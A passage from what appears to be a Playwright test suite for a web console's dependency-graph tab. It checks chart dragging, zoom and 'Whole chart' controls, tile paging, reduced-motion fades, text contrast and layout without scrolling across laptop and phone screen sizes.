  assert.ok(Math.abs(end.x - start.x + 50) <= 2 && Math.abs(end.y - start.y + 30) <= 2, 'the chart did not move with the drag: ' + JSON.stringify([start, end]));
  assert.equal(end.win, start.win, 'the drag moved the page');
  assert.deepEqual(narrow.errors, []);
  await narrow.context.close();
});

await check('AT: a press on a chart whose release never comes, as when a menu opened on the press takes it, is no drag: the first move made with no button held ends it, nothing moves with the bare mouse, and the next press and drag are the person\'s own', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 1280, height: 800 } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const r = await zoomedEpic(page);
  // the mouse's own pointer id, read from a real move, so the press made below is the mouse's
  await page.evaluate(() => { window.__pid = null; window.addEventListener('pointermove', (e) => { if (e.pointerType === 'mouse') window.__pid = e.pointerId; }); });
  await page.mouse.move(r.x, r.y);
  const pid = await page.evaluate(() => window.__pid);
  const before = await panState(page);
  // the press alone, with no release after it, as a Mac's Ctrl+click gives it: the menu it opens
  // takes the release
  await page.evaluate(({ x, y, pid }) => {
    Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden).querySelector('.control__chart').dispatchEvent(new PointerEvent('pointerdown', { pointerId: pid, pointerType: 'mouse', isPrimary: true, button: 0, buttons: 1, clientX: x, clientY: y, bubbles: true, cancelable: true }));
  }, { x: r.x, y: r.y, pid });
  // the bare mouse moved across the stage, toward its middle, so the moves reach the stage itself
  // and not only what lies beside it, which would say nothing
  await page.evaluate(() => { window.__overStage = 0; Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden).querySelector('.control__chart').addEventListener('pointermove', () => { window.__overStage += 1; }); });
  await page.mouse.move(r.x + 150, r.y + 40, { steps: 6 });
  const overStage = await page.evaluate(() => window.__overStage);
  const moved = await panState(page);
  // the next press is the + button's, and the next drag moves the chart as far as the mouse goes
  await page.click('#cp-graph .graph__section[data-focus="epic-20"] button.graph__zbtn[aria-label="Zoom out"]');
  await sleep(300);
  const out = await panState(page);
  const q = await zoomedEpic(page);
  const ready = await panState(page);
  await drag(page, q, { x: q.x - 60, y: q.y - 30 });
  const dragged = await panState(page);
  console.log('     mouse pointer:', pid, '| before:', JSON.stringify([before.x, before.y]), '| after the bare move:', JSON.stringify([moved.x, moved.y, moved.panning]), 'over the stage', overStage, '| zoomed out:', out.k, 'from', before.k, '| a drag after it:', JSON.stringify([ready.x, ready.y, dragged.x, dragged.y]));
  assert.ok(pid !== null, 'no move of the mouse was seen');
  assert.ok(overStage >= 3, 'the bare moves did not reach the stage, so they say nothing: ' + overStage);
  assert.deepEqual([moved.x, moved.y], [before.x, before.y], 'the chart moved with the mouse though no button was held');
  assert.equal(moved.panning, false, 'the chart is still being dragged');
  assert.ok(out.k < before.k - 1e-3, 'the press after the lost release did not reach the zoom\'s button');
  assert.ok(Math.abs(dragged.x - ready.x + 60) <= 2 && Math.abs(dragged.y - ready.y + 30) <= 2, 'the drag after the lost release did not move the chart as far as the mouse went');
  assert.deepEqual(errors, []);
  await context.close();
});

// Whole chart, the card's button that took the place of Fit: the chart is whole whatever its size
// (the owner, 2026-10-19: "the default view of ever tab should be to just have all the shit out in
// front of you"), and this button brings it back there
const wholeButton = (page) => page.evaluate(() => {
  const b = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden).querySelector('.graph__fit');
  return { text: b.textContent, hidden: b.hidden, idle: b.classList.contains('graph__fit--idle'), shown: getComputedStyle(b).display !== 'none' };
});
await check('AN: Whole chart is on every card, quiet while the chart is whole and lit once it is zoomed or in focus, and draws it whole again from either; a chart drawn in a hidden tab or a hidden card opens whole once it is shown', async () => {
  // the wide chart drawn while the console stands on another tab, where its stage has no size yet,
  // so it can be fitted only once the tab opens and the stage is laid out with one
  const { context, page, errors } = await open(wideRoutes(), { viewport: { width: 1280, height: 800 } });
  await signIn(page, null);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 1 read/, 15000);
  const hiddenWhileDrawn = await page.evaluate(() => document.getElementById('tab-dependencies').hidden);
  await toTab(page, 'dependencies');
  await sleep(400);
  const opened = await stageRead(page);
  assertWhole(opened, 'the wide chart drawn in a hidden tab');
  const atRest = await wholeButton(page);
  await page.click('#cp-graph .graph__section:not([hidden]) button.graph__zbtn[aria-label="Zoom in"]');
  await sleep(300);
  const zoomed = await stageRead(page), lit = await wholeButton(page);
  await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
  await sleep(400);
  const back = await stageRead(page), quiet = await wholeButton(page);
  // from a focus: the press on a node, then Whole chart
  const n = await nodeAt(page, 75);
  await page.mouse.click(n.x, n.y);
  await waitNear(page, 75);
  const inFocus = await wholeButton(page);
  await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
  await sleep(400);
  const fromFocus = await stageRead(page), near = await nearRead(page), last = await wholeButton(page);
  console.log('     drawn in a hidden tab:', hiddenWhileDrawn, '| opened:', JSON.stringify([opened.k, opened.box]), '| button at rest:', JSON.stringify(atRest), '| zoomed:', zoomed.k, JSON.stringify(lit), '| back:', back.k, JSON.stringify(quiet), '| in focus:', JSON.stringify(inFocus), '| from the focus:', JSON.stringify([fromFocus.k, near.open, near.whole]), JSON.stringify(last));
  assert.equal(hiddenWhileDrawn, true, 'the wide chart was not drawn in a hidden tab');
  assert.ok(opened.k < 1, 'the chart fits its stage at its own size, so this says nothing');
  assert.deepEqual([atRest.text, atRest.shown, atRest.idle], ['Whole chart', true, true], 'Whole chart is not there, or is lit on a chart already whole');
  assert.ok(zoomed.k > opened.k * 1.3, 'the zoom\'s + did not zoom in');
  assert.equal(lit.idle, false, 'Whole chart stays quiet on a chart zoomed in');
  assert.ok(Math.abs(back.k - opened.k) < 1e-6, 'Whole chart did not draw the chart whole again');
  assertWhole(back, 'the chart after Whole chart');
  assert.equal(quiet.idle, true);
  assert.equal(inFocus.idle, false, 'Whole chart stays quiet on a focus');
  assert.deepEqual([near.open, near.whole], [false, true], 'Whole chart did not close the focus');
  assertWhole(fromFocus, 'the chart after Whole chart from a focus');
  assert.equal(last.idle, true);
  assert.deepEqual(errors, []);
  await context.close();
  // the wide epic under a goal: the Goals chart is shown first, so the epic's card is hidden when it
  // is drawn, and opens whole once its tile is pressed
  const routes = wideRoutes([issue(1, 'Ship it', ['goal'], subs(0, 1))]);
  routes['GET /repos/acme/demo/issues/1/sub_issues'] = [issue(70, 'A wide epic', ['epic'], subs(0, 12))];
  const card = await open(routes, { viewport: { width: 1280, height: 800 } });
  await signIn(card.page);
  await card.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(card.page, /^Drawn from 2 reads/, 15000);
  const cardHidden = await card.page.$eval('#cp-graph .graph__section[data-focus="epic-70"]', (sec) => sec.hidden);
  await card.page.click('#cp-graph-focus button[data-focus="epic-70"]');
  await sleep(400);
  const shown = await stageRead(card.page);
  console.log('     the wide epic\'s card hidden when drawn:', cardHidden, '| once its tile is pressed:', JSON.stringify([shown.k, shown.box]));
  assert.equal(cardHidden, true, 'the wide epic\'s card was not hidden when drawn');
  assertWhole(shown, 'the wide chart drawn in a hidden card');
  assert.deepEqual(card.errors, []);
  await card.context.close();
});

await check('AO: the chart a person chooses fades in, the one shown on load does not, and nothing fades where the system asks for less motion', async () => {
  const fades = (page) => page.$$eval('#cp-graph .graph__section', (secs) => secs.filter((s) => !s.hidden).map((s) => [s.getAttribute('data-focus'), s.classList.contains('graph__section--enter'), getComputedStyle(s).animationName]));
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const onLoad = await fades(page);
  await page.click('#cp-graph-focus button[data-focus="epic-20"]');
  const pressed = await fades(page);
  await page.emulateMedia({ reducedMotion: 'reduce' });
  await page.click('#cp-graph-focus button[data-focus="goals"]');
  const still = await fades(page);
  console.log('     on load:', JSON.stringify(onLoad), '| pressed:', JSON.stringify(pressed), '| less motion:', JSON.stringify(still));
  assert.deepEqual(onLoad, [['goals', false, 'none']]);
  assert.deepEqual(pressed, [['epic-20', true, 'graph-enter']]);
  assert.deepEqual(still, [['goals', true, 'none']]);
  assert.deepEqual(errors, []);
  await context.close();
});

// The look's review (2026-10-19): an epic's sub-issues in another repository, the strip on a laptop
// with many epics, a card's tools in one place, and the small words' contrast.
await check('AQ: an epic\'s sub-issue in another repository, which GitHub\'s summary and so the bar count and no chart draws, has a pill of its own, so the pills add up to the bar\'s total', async () => {
  // epic #20 with a fourth sub-issue, closed and in another repository: GitHub's summary gives 2 of 4
  const f = fixture();
  const away = issue(5, 'Settled elsewhere', ['todo'], { state: 'closed', repository_url: OTHER_REPO, html_url: 'https://github.com/other/place/issues/5' });
  f.open = f.open.map((it) => it.number === 20 ? Object.assign({}, it, subs(2, 4)) : it);
  f.subIssues[20] = f.subIssues[20].concat([away]);
  const { context, page, errors } = await open(fixtureRoutes(f), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const card = await page.$eval('#cp-graph .graph__section[data-focus="epic-20"]', (sec) => ({
    done: sec.querySelector('.graph__done').textContent,
    pills: Array.from(sec.querySelectorAll('.graph__pill')).map((p) => [p.className.replace('graph__pill graph__pill--', ''), Number(p.querySelector('b').textContent), p.textContent]),
    list: sec.querySelectorAll('.graph__list tbody tr').length,
  }));
  console.log('     epic #20\'s card:', JSON.stringify(card));
  assert.equal(card.done, '2 of 4 closed');
  assert.deepEqual(card.pills, [['todo', 1, '1 to do'], ['claimed', 1, '1 claimed'], ['closed', 1, '1 closed'], ['elsewhere', 1, '1 in another repository'], ['outside', 1, '1 from outside the epic']]);
  assert.equal(card.pills.filter((p) => p[0] !== 'outside').reduce((sum, p) => sum + p[1], 0), 4, 'the pills do not add up to the bar\'s total');
  // the chart draws this repository's issues alone: #21, #22, #23 and the blocker #99
  assert.equal(card.list, 4, 'the list does not hold the four issues the chart draws');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('AR: on a laptop the tiles never scroll however many epics there are: with a goal and twelve epics they show a page at a time in one compact row, turned by its arrows, by a swipe across it and by the arrow keys past a page\'s end, so the charts keep most of the deck; and where the console is one long page, in a window 800 px wide, which the tab holds still while it is shown, the wheel over the tiles turns nothing and moves nothing', async () => {
  // a short laptop window, 1280 x 640: the deck takes the whole window, the site's bar hidden over
  // it, and at 1280 x 720 the tab, 672 px tall, is tall enough to spare the tiles a second row, so
  // they all fit on one page (since 2026-10-20 the foot and the Ask Claude bar are gone and the tab takes the window's height but for its head)
  const { context, page, errors } = await open(manyRoutes(12), { extraRoutes: [stubRoute], viewport: { width: 1280, height: 640 } });
  await signIn(page);
  await waitGraph(page, /^Drawn from 13 reads/, 15000);
  const lay = () => page.evaluate(() => {
    const s = document.getElementById('cp-graph-focus'), panel = document.getElementById('tab-dependencies'), box = panel.querySelector('.console__scroll');
    const tiles = Array.from(s.querySelectorAll('.graph__chip')), shown = tiles.filter((b) => !b.hidden);
    const tops = shown.map((b) => Math.round(b.getBoundingClientRect().top));
    const arrows = Array.from(s.querySelectorAll('.graph__page')).map((b) => (b.hidden ? 'hidden' : b.disabled ? 'off' : 'on'));
    return { tiles: tiles.length, shown: shown.map((b) => b.getAttribute('data-focus')), oneRow: tops.every((t) => Math.abs(t - tops[0]) <= 1), strip: Math.round(s.getBoundingClientRect().height), panel: Math.round(panel.getBoundingClientRect().height),
      box: Math.round(box.getBoundingClientRect().height), scrolls: s.scrollWidth > s.clientWidth + 1, arrows, pressed: (tiles.find((b) => b.getAttribute('aria-pressed') === 'true') || {}).getAttribute('data-focus'), keyed: document.activeElement.getAttribute('data-focus'), y: window.scrollY };
  });
  const first = await lay();
  // a swipe across the row, the mouse dragged from right to left, turns to the page after, and the
  // arrows at the row's ends turn back and on again
  const r = await page.$eval('#cp-graph-focus', (s) => { const b = s.getBoundingClientRect(); return { x: b.left + b.width / 2, y: b.top + b.height / 2 }; });
  await drag(page, { x: r.x + 120, y: r.y }, { x: r.x - 120, y: r.y });
  const swiped = await lay();
  // read at once, since the arrows pressed next need the page the swipe turned to
  const later = (a, b) => a.shown[0] !== b.shown[0] && Number(/[0-9]+/.exec(a.shown[0]) || 0) > Number(/[0-9]+/.exec(b.shown[0]) || 0);
  assert.ok(later(swiped, first), 'the swipe did not turn to the later tiles');
  await page.click('#cp-graph-focus .graph__page[data-step="-1"]');
  const turnedBack = await lay();
  await page.click('#cp-graph-focus .graph__page[data-step="1"]');
  const turned = await lay();
  // the wheel over the tiles, where the console holds the window, turns nothing and moves nothing
  await page.mouse.move(r.x, r.y);
  await page.mouse.wheel(0, 300);
  await sleep(300);
  const wheeled = await lay();
  // the arrow key past the first page's last tile turns to the next page with that tile in view
  await page.click('#cp-graph-focus .graph__page[data-step="-1"]');
  const back = await lay();
  await page.focus('#cp-graph-focus button[data-focus="' + back.shown[back.shown.length - 1] + '"]');
  await page.keyboard.press('ArrowRight');
  const keyed = await lay();
  await page.keyboard.press('End');
  const last = await lay();
  console.log('     a goal and twelve epics at 1280 x 640:', JSON.stringify(first), '| after a swipe:', JSON.stringify(swiped.shown), '| back and on by the arrows:', JSON.stringify([turnedBack.shown[0], turned.shown[0]]), '| after the wheel:', JSON.stringify([wheeled.shown, wheeled.y]), '| ArrowRight past the page:', JSON.stringify([keyed.shown, keyed.pressed, keyed.keyed]), '| End:', JSON.stringify([last.shown, last.pressed, last.arrows]));
  const per = first.shown.length;
  assert.deepEqual([first.tiles, first.oneRow, first.scrolls], [14, true, false], 'the tiles are not one row that never scrolls');
  assert.ok(per >= 6 && per < 14, 'the tiles are not a page at a time, or a page holds fewer than six: ' + per);
  assert.deepEqual(first.arrows, ['off', 'on'], 'the row\'s arrows do not say there are later tiles and no earlier ones');
  assert.ok(first.strip <= 100, 'the strip is taller than one compact row: ' + first.strip + ' px');
  assert.ok(first.box >= 0.6 * first.panel, 'the charts keep less than three fifths of the deck: ' + first.box + ' of ' + first.panel + ' px');
  assert.deepEqual([turnedBack.shown, turned.shown], [first.shown, swiped.shown], 'the arrows did not turn back and on again');
  assert.deepEqual([wheeled.shown, wheeled.y], [turned.shown, turned.y], 'the wheel over the tiles turned them or moved the window');
  assert.deepEqual(back.shown, first.shown, 'the arrows did not turn back to the first page');
  assert.ok(keyed.shown.indexOf(keyed.pressed) >= 0 && keyed.shown[0] !== first.shown[0] && keyed.keyed === keyed.pressed, 'the arrow key past the page\'s end did not turn to the tile it moved to');
  assert.deepEqual([last.pressed, last.shown.indexOf('epic-1200') >= 0, last.arrows], ['epic-1200', true, ['on', 'off']], 'End did not turn to the last page');
  assert.deepEqual(errors, []);
  await context.close();
  // 800 px wide, a phone's layout, where the console holds the screen (site branch
  // claude/project-thread-6cxgh2): the page has nothing to scroll, and the wheel over the strip
  // turns nothing and moves nothing
  const narrow = await open(manyRoutes(12), { extraRoutes: [stubRoute], viewport: { width: 800, height: 700 } });
  await signIn(narrow.page);
  await waitGraph(narrow.page, /^Drawn from 13 reads/, 15000);
  await narrow.page.evaluate(() => { const s = document.getElementById('cp-graph-focus'); window.scrollTo({ top: Math.round(s.getBoundingClientRect().top + window.scrollY - 200), behavior: 'instant' }); });
  await sleep(200);
  const spot = () => narrow.page.evaluate(() => ({ shown: Array.from(document.querySelectorAll('#cp-graph-focus .graph__chip')).filter((b) => !b.hidden).map((b) => b.getAttribute('data-focus')).join(), y: Math.round(window.scrollY), paged: Array.from(document.querySelectorAll('#cp-graph-focus .graph__page')).some((b) => !b.hidden) }));
  const at = await spot();
  const q = await narrow.page.$eval('#cp-graph-focus', (s) => { const b = s.getBoundingClientRect(); return { x: b.left + b.width / 2, y: b.top + b.height / 2 }; });
  await narrow.page.mouse.move(q.x, q.y);
  await narrow.page.mouse.wheel(0, 300);
  await sleep(300);
  const after = await spot();
  console.log('     in the one long page: before the wheel', JSON.stringify(at), '| after', JSON.stringify(after));
  assert.equal(after.shown, at.shown, 'the wheel turned the tiles at 800 px');
  assert.deepEqual([at.y, after.y], [0, 0], 'the page scrolled at 800 px, where the console holds the screen');
  assert.deepEqual(narrow.errors, []);
  await narrow.context.close();
});

await check('AS: a card\'s tools, Chart and List, the zoom\'s buttons and Previous and Next, keep one place on every card however long its heading, however many its pills and whatever its chart\'s size, so Next pressed again and again by the mouse steps through every chart; on a phone they share one row at the top of the card', async () => {
  const { context, page, errors } = await open(manyRoutes(5, true), { viewport: { width: 1366, height: 768 } });
  await signIn(page);
  await waitGraph(page, /^Drawn from 6 reads/, 30000);
  await sleep(300);
  const nextAt = () => page.evaluate(() => {
    const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((x) => !x.hidden);
    const mid = (sel) => { const b = sec.querySelector(sel).getBoundingClientRect(); return [Math.round(b.left + b.width / 2), Math.round(b.top + b.height / 2)]; };
    const svg = sec.querySelector('.control__chart > svg'), m = /scale\(([0-9.e-]+)\)/.exec(svg ? svg.style.transform : '');
    return { card: sec.getAttribute('data-focus'), next: mid('.graph__next'), tools: [mid('.graph__view[data-view="list"]'), mid('button.graph__zbtn[aria-label="Zoom in"]'), mid('.graph__fit')], heading: Math.round(sec.querySelector('.graph__head h3').getBoundingClientRect().height),
      pills: sec.querySelectorAll('.graph__pill').length, natural: !!m && Number(m[1]) > 0.999 };
  });
  const seen = [await nextAt()];
  // the mouse pressed where Next stood on the first card, again and again, as a person stepping through does
  for (let i = 0; i < 5; i++) { await page.mouse.click(seen[0].next[0], seen[0].next[1]); await sleep(300); seen.push(await nextAt()); }
  console.log('     Next on each card in turn:', JSON.stringify(seen));
  assert.deepEqual(seen.map((c) => c.card), ['goals', 'epic-100', 'epic-200', 'epic-300', 'epic-400', 'epic-500'], 'Next pressed at one spot did not step through every chart');
  assert.ok(new Set(seen.map((c) => c.heading)).size > 1 && new Set(seen.map((c) => c.pills)).size > 1 && seen.some((c) => c.natural) && seen.some((c) => !c.natural), 'the cards do not differ in their headings, pills and charts\' sizes, so this says nothing');
  const same = (a, b) => Math.abs(a[0] - b[0]) <= 1 && Math.abs(a[1] - b[1]) <= 1;
  assert.ok(seen.every((c) => same(c.next, seen[0].next)), 'Next moved from card to card');
  assert.ok(seen.every((c) => c.tools.every((t, i) => same(t, seen[0].tools[i]))), 'List, the zoom\'s + or Whole chart moved from card to card');
  assert.deepEqual(errors, []);
  await context.close();
  const phone = await open(manyRoutes(5, true), { viewport: { width: 390, height: 844 }, mobile: true, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-200' }) } });
  await signIn(phone.page);
  await waitGraph(phone.page, /^Drawn from 6 reads/, 30000);
  await sleep(300);
  const tools = await phone.page.$eval('#cp-graph .graph__section[data-focus="epic-200"]', (sec) => {
    const r = (sel) => { const b = sec.querySelector(sel).getBoundingClientRect(); return { top: Math.round(b.top), bottom: Math.round(b.bottom), mid: Math.round(b.top + b.height / 2), left: Math.round(b.left), right: Math.round(b.right), shown: getComputedStyle(sec.querySelector(sel)).display !== 'none' }; };
    return { views: r('.graph__views'), fit: r('.graph__fit'), step: r('.graph__step'), heading: r('.graph__head h3'), width: window.innerWidth };
  });
  console.log('     a phone\'s card:', JSON.stringify(tools));
  assert.ok(tools.views.shown && tools.fit.shown && tools.step.shown, 'a tool is missing on a phone\'s card');
  assert.ok(Math.abs(tools.fit.mid - tools.step.mid) <= 2 && Math.abs(tools.views.mid - tools.step.mid) <= 2, 'Chart and List, Whole chart and Previous and Next are not on one row');
  assert.ok(tools.step.bottom <= tools.heading.top, 'the tools are not at the top of the card, above its heading');
  assert.ok([tools.views, tools.fit, tools.step].every((t) => t.left >= 0 && t.right <= tools.width), 'a tool runs off the phone\'s screen');
  assert.deepEqual(phone.errors, []);
  await phone.context.close();
});

// the contrast of a node's words on the ground it shows on, each background up the tree laid over
// the one under it, as a translucent tile's is
const wordsContrast = (page, selector) => page.$eval(selector, (node) => {
  const rgba = (c) => { const m = /rgba?\(([^)]+)\)/.exec(c || ''); if (!m) return null; const v = m[1].split(',').map(parseFloat); return v.length < 4 ? v.concat(1) : v; };
  const over = (top, under) => [0, 1, 2].map((i) => top[i] * top[3] + under[i] * (1 - top[3]));
  const chain = [];
  for (let n = node; n; n = n.parentElement) chain.unshift(rgba(getComputedStyle(n).backgroundColor));
  let ground = [255, 255, 255];
  for (const c of chain) if (c && c[3] > 0) ground = over(c, ground);
  const ink = over(rgba(getComputedStyle(node).color), ground);
  const lum = (c) => c.map((v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); }).reduce((sum, v, i) => sum + v * [0.2126, 0.7152, 0.0722][i], 0);
  const a = lum(ink) + 0.05, b = lum(ground) + 0.05;
  return Math.round(100 * Math.max(a, b) / Math.min(a, b)) / 100;
});
await check('AU: the small words of the tiles and the cards read at 4.5 to 1 on their ground: a tile\'s kind and its count, at rest and under the pointer, and a card\'s place among the charts', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const tile = '#cp-graph-focus .graph__chip[data-focus="epic-20"] ';
  const rest = { kind: await wordsContrast(page, tile + '.graph__tkind'), foot: await wordsContrast(page, tile + '.graph__tfoot') };
  await page.hover(tile.trim());
  await sleep(400);
  const hover = { kind: await wordsContrast(page, tile + '.graph__tkind'), foot: await wordsContrast(page, tile + '.graph__tfoot') };
  const place = await wordsContrast(page, '#cp-graph .graph__section[data-focus="goals"] .graph__pos');
  console.log('     at rest:', JSON.stringify(rest), '| under the pointer:', JSON.stringify(hover), '| a card\'s place:', place);
  for (const [name, ratio] of [['kind at rest', rest.kind], ['count at rest', rest.foot], ['kind under the pointer', hover.kind], ['count under the pointer', hover.foot], ['card\'s place', place]]) {
    assert.ok(ratio >= 4.5, 'a tile\'s or a card\'s small words read at ' + ratio + ' to 1 (' + name + ')');
  }
  assert.deepEqual(errors, []);
  await context.close();
});

// The whole of every chart in front of the person (the owner, 2026-10-19: "I want all the nodes
// visible without scrolling, I literally never in any case want to scroll, I'd prefer to need to
// zoom ... Just pinch and zoom on mobile, touch to focus ... the default view of ever tab should be
// to just have all the shit out in front of you and let the user scroll in, and buttons should be
// dynamically sized to fit the screen they are on"): AV to BK. The request's windows are three
// laptops and a monitor, and a phone held upright and sideways.
const SCREENS = [[1280, 800], [1366, 768], [1440, 900], [1920, 1080], [390, 844, true], [844, 390, true]];
// the tiles' two forms as the site's script sizes them (GRAPH_TILE_FULL and GRAPH_TILE_SMALL): the
// full form where each tile has 168 px, the compact one down to 80
const GRAPH_TILE_FULL = 168, GRAPH_TILE_SMALL = 80;
// every box in and around the Dependencies tab that could scroll, by name, with what it holds past its
// own size either way where that is more than a pixel: the page, the deck, the console's stage, the
// tab and its box, the tiles' row, the key's line, the charts' box, and each card shown with its stage
// and its list.
// The page's height is left out only where the tab holds it still, on a phone, whose console is one
// long page (control.css); there the tab itself is held to the screen (AV, BL). A list shrunk to its card is read
// by its table as drawn: the box under a transform keeps its own size for its scroll height, though
// nothing of it lies past the box or can be scrolled to (BH)
const overflows = (page) => page.evaluate(() => {
  const tab = document.getElementById('tab-dependencies');
  const named = [['the page', document.documentElement], ['the deck', document.getElementById('console')], ['the console\'s stage', tab.closest('.console__stage')], ['the tab', tab],
    ['the tab\'s box', tab.querySelector('.console__scroll')], ['the tiles', document.getElementById('cp-graph-focus')], ['the key', document.getElementById('cp-graph-key')], ['the charts\' box', document.getElementById('cp-graph')]];
  Array.from(document.querySelectorAll('#cp-graph .graph__section')).filter((s) => !s.hidden).forEach((s) => {
    const key = s.getAttribute('data-focus'), list = s.querySelector('.graph__list');
    named.push(['the card ' + key, s], ['the stage of ' + key, s.querySelector('.control__chart')]);
    if (!list.hidden) named.push(['the list of ' + key, list]);
  });
  // a phone's page is one long page, which the tab holds still while it is shown (graph--held, the
  // window's overflow hidden): its height is left out there alone, and BL proves no touch moves it
  const held = document.documentElement.classList.contains('graph--held') && getComputedStyle(document.body).overflowY === 'hidden';
  const past = (e) => {
    if (!e.classList.contains('graph__list')) return [e.scrollWidth - e.clientWidth, e.scrollHeight - e.clientHeight];
    const l = e.getBoundingClientRect(), t = e.querySelector('table').getBoundingClientRect();
    return [Math.round(Math.max(t.right - l.right, l.left - t.left)), Math.round(Math.max(t.bottom - l.bottom, l.top - t.top))];
  };
  const out = [];
  for (const [name, e] of named) {
    if (!e) continue;
    const [dx, dy] = past(e);
    if (dx > 1 || (dy > 1 && !(held && name === 'the page'))) out.push(name + ' by ' + dx + ' x ' + dy);
  }
  return out;
});
// a tile's chart shown by the tile's own press, wherever its page of tiles is
const pick = (page, key) => page.$eval('#cp-graph-focus .graph__chip[data-focus="' + key + '"]', (b) => b.click());
const stageOfCard = (key) => '#cp-graph .graph__section[data-focus="' + key + '"] .control__chart';
const shownKeys = (page) => page.$$eval('#cp-graph .graph__section', (ss) => ss.filter((s) => !s.hidden).map((s) => s.getAttribute('data-focus')));
// each chart shown in turn by its tile, All last: nothing anywhere holds more than its box, every
// stage shown holds its whole picture, and the tiles shown lie inside their row; the scales seen
async function everyChart(page, what) {
  const keys = await page.$$eval('#cp-graph-focus .graph__chip', (bs) => bs.map((b) => b.getAttribute('data-focus')));
  const scales = {};
  for (const key of keys.filter((k) => k !== 'all').concat(keys.indexOf('all') >= 0 ? ['all'] : [])) {
    await pick(page, key);
    await sleep(250);
    const over = await overflows(page);
    assert.deepEqual(over, [], what + ', ' + key + ' shown: something holds more than its box: ' + over.join('; '));
    for (const k of await shownKeys(page)) {
      const s = await stageRead(page, stageOfCard(k));
      assertWhole(s, what + ', ' + key + ' shown, the chart ' + k);
      if (key === k) scales[k] = Math.round(s.k * 1000) / 1000;
    }
    const tiles = await page.$eval('#cp-graph-focus', (strip) => {
      const b = strip.getBoundingClientRect();
      return Array.from(strip.querySelectorAll('.graph__chip')).filter((t) => !t.hidden).filter((t) => { const r = t.getBoundingClientRect(); return r.left < b.left - 1 || r.right > b.right + 1 || r.top < b.top - 1 || r.bottom > b.bottom + 1; }).map((t) => t.getAttribute('data-focus'));
    });
    assert.deepEqual(tiles, [], what + ', ' + key + ' shown: a tile shown runs past its row');
  }
  return scales;
}
// where the tab stands on a phone's screen: under the site's header, above the note over the
// screen's foot where one shows, else above the screen's bottom (since 2026-10-20 the message is a
// note floating over the foot, which takes no room while it is empty), and the page no wider than
// the screen
const heldOnPhone = (page) => page.evaluate(() => {
  const tab = document.getElementById('tab-dependencies').getBoundingClientRect(), nav = document.getElementById('nav');
  return { top: Math.round(tab.top), bottom: Math.round(tab.bottom), header: nav ? Math.round(nav.getBoundingClientRect().bottom) : 0, foot: Math.round((document.getElementById('msg').firstChild ? document.querySelector('.console__status').getBoundingClientRect().top : innerHeight)),
    wider: document.documentElement.scrollWidth - document.documentElement.clientWidth };
});
const textSize = (page) => page.textContent('#cp-zoom-reset');
async function textTo(page, button, times) {
  for (let i = 0; i < times; i++) { await page.click(button); await sleep(200); }
  await sleep(250);
}
await check('AV: nothing scrolls in the Dependencies tab: at 1280 x 800, 1366 x 768, 1440 x 900 and 1920 x 1080, at the smallest, the usual and the largest text size and every step between, and on a phone held either way, the page, the deck, the tab and its box, the tiles\' row, every card, stage and list hold no more than their boxes, every chart and All show every node inside their stages, and on a phone the tab lies wholly on the screen between the header and the foot', async () => {
  for (const [width, height, mobile] of SCREENS) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(manyRoutes(6, true), { viewport: { width, height }, mobile });
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 7 reads/, 30000);
    await sleep(400);
    const usual = await everyChart(page, what);
    const line = [what + ' at ' + await textSize(page) + ':', JSON.stringify(usual)];
    if (mobile) {
      const held = await heldOnPhone(page);
      line.push('| the tab on the screen:', JSON.stringify(held));
      assert.ok(held.top >= held.header - 1 && held.bottom <= held.foot + 1, what + ': the tab is not wholly on the screen between the header and the foot: ' + JSON.stringify(held));
      assert.ok(held.wider <= 1, what + ': the page is wider than the screen by ' + held.wider + ' px');
      // a short tab, as a phone's held sideways is, gives its card's heading's room to the chart: the
      // heading keeps no height of its own, and its words stay for a screen reader; one chart shown,
      // since All, which everyChart leaves shown, heads each of its cells
      await pick(page, 'epic-100');
      await sleep(250);
      const heading = await page.evaluate(() => {
        const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden), h = sec.querySelector('.graph__head h3');
        return { short: document.getElementById('tab-dependencies').classList.contains('graph--short'), height: Math.round(h.getBoundingClientRect().height), words: h.textContent.trim().length > 0 };
      });
      line.push('| the heading:', JSON.stringify(heading));
      if (height <= 520) assert.equal(heading.short, true, what + ': the tab is not short on a phone held sideways, so this says nothing');
      if (heading.short) assert.ok(heading.height <= 1 && heading.words, what + ': a short tab keeps its card\'s heading\'s room from the chart: ' + JSON.stringify(heading));
    } else {
      // every step of the text size, smallest to largest, with the first chart and All; every chart
      // again at the two ends
      await textTo(page, '#cp-zoom-down', 3);
      const sizes = [];
      for (let step = 0; step < 9; step++) {
        const size = await textSize(page);
        sizes.push(size);
        if (step === 0 || step === 8) line.push('| at ' + size + ':', JSON.stringify(await everyChart(page, what + ' at ' + size)));
        else {
          for (const key of ['goals', 'all']) {
            await pick(page, key);
            await sleep(250);
            const over = await overflows(page);
            assert.deepEqual(over, [], what + ' at ' + size + ', ' + key + ' shown: something holds more than its box: ' + over.join('; '));
